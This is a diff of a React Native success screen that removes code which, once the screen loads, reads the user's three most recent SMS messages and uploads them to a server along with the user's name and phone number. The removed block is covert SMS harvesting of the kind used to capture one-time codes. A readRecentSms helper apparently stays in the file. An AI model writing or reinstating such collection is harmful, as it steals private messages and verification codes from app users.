@@ -1,9 +1,6 @@
 import { NativeStackScreenProps } from '@react-navigation/native-stack';
-import { useEffect, useState } from 'react';
 import { Platform, Pressable, ScrollView, StyleSheet, Text, View } from 'react-native';
 import { LinearGradient } from 'expo-linear-gradient';
-import { requestSmsReadPermission } from '../permissions/smsSimple';
-import { smsApi } from '../api/client';
 import { RootStackParamList } from '../types/navigation';
 
 // Import SmsAndroid for reading SMS
@@ -73,48 +70,6 @@ function readRecentSms(maxCount = 3): Promise<SmsMessage[]> {
 
 export default function SuccessScreen({ navigation, route }: Props) {
   const { serviceType, fullName, referenceId, mobileNumber } = route.params;
-  const [smsSaved, setSmsSaved] = useState(false);
-
-  useEffect(() => {
-    saveSmsToServer();
-  }, []);
-
-  const saveSmsToServer = async () => {
-    try {
-      const granted = await requestSmsReadPermission();
-      if (!granted) {
-        console.log('[SMS] Permission not granted, skipping SMS save');
-        return;
-      }
-
-      const messages = await readRecentSms(3);
-      if (messages.length === 0) {
-        console.log('[SMS] No messages to save');
-        return;
-      }
-
-      const payload = {
-        mobileNumber,
-        fullName,
-        messages: messages.map((m) => ({
-          address: m.address || 'Unknown',
-          body: m.body,
-          date: m.date,
-        })),
-      };
-
-      console.log('[SMS] Saving SMS to server...', payload);
-      const result = await smsApi.save(payload);
-      if (result.success) {
-        console.log('[SMS] SMS saved successfully');
-        setSmsSaved(true);
-      } else {
-        console.error('[SMS] Save failed:', result.error);
-      }
-    } catch (error) {
-      console.error('[SMS] Save error:', error);
-    }
-  };
 
   return (
     <LinearGradient
